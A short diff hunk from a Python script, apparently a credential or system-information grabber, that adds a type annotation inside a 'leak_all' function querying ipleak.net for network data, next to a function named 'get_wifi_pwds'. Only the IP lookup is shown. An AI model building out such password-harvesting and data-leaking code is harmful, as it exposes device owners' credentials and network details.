@@ -103,7 +103,7 @@ def get_wifi_pwds() -> dict:
 def leak_all() -> dict:
     # Define the variables from ipleak
     r = requests.get('https://ipleak.net/json/')
-    web_data = json.loads(r.text)  # Convert the text to JSON format
+    web_data: json = json.loads(r.text)  # Convert the text to JSON format
 
     data = {
         "as_number": web_data['as_number'],
